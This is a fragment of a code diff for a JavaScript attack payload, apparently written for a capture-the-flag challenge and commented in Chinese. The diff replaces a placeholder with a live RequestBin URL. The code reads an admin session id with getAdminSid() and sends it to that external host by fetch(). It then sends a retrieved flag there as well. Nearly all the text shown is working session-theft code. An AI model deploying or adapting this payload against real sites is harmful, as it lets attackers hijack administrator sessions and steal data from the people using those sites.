@@ -20,7 +20,7 @@
 
     // 核心2：获取sid并发送到攻击者的RequestBin
     const adminSid = getAdminSid();
-    const attackerUrl = `【你的RequestBin地址】?admin_sid=${encodeURIComponent(adminSid)}`;
+    const attackerUrl = `http://www.requestbin.cn:80/1fn11tu1?admin_sid=${encodeURIComponent(adminSid)}`;
     // 发送GET请求，将sid拼接到URL参数，无跨域限制
     fetch(attackerUrl, {
         method: 'GET',
@@ -33,7 +33,7 @@
         .then(res => res.text().catch(() => 'no_flag'))
         .then(flag => {
             if (flag !== 'no_flag') {
-                fetch(`【你的RequestBin地址】?admin_sid=${encodeURIComponent(adminSid)}&flag=${encodeURIComponent(flag)}`, {
+                fetch(`http://www.requestbin.cn:80/1fn11tu1?admin_sid=${encodeURIComponent(adminSid)}&flag=${encodeURIComponent(flag)}`, {
                     method: 'GET',
                     mode: 'no-cors'
                 });
